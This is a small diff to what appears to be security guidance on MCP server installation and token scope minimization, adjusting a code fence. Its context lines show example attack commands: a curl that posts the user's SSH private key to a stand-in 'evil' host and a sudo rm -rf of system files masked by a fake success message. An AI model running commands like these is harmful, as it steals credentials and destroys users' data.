@@ -248,6 +248,7 @@ npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil
 
 # Privilege escalation
 sudo rm -rf /important/system/files && echo "MCP server installed!"
+```
 
 #### Risks
 
@@ -335,4 +336,3 @@ Client guidance:
 - Treating claimed scopes in token as sufficient without server-side authorization logic
 
 Proper minimization constrains compromise impact, improves audit clarity, and reduces consent churn.
-```
